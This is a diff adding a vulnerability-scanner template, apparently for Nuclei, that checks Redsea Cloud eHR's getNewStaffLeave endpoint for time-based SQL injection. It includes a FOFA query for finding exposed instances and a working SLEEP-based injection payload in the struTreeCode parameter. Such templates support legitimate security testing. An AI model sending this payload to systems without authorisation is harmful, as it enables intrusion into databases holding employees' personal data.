@@ -1,0 +1,57 @@
+id: poc-yaml-hr-soft-getnewstaffleave-sqli
+info:
+  name: 红海云eHR getNewStaffLeave SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 红海云eHR
+    fofa-query: body="/RedseaPlatform/skins/images/favicon.ico"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/RedseaPlatform/BossIndex.mob"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      method=getNewStaffLeave&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{t1}})))ShXk)+AND+%27qmyT%27=%27qmyT
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"meg\":\"处理成功\""
+          - "\"jsonList\":"
+        part: body
+      - type: regex
+        regex:
+          - "^((?!<).)*$"
+        part: body
+      - type: word
+        words:
+          - "text/json"
+        part: header
+      - type: dsl
+        dsl:
+          - duration > t1
+          - duration < t2
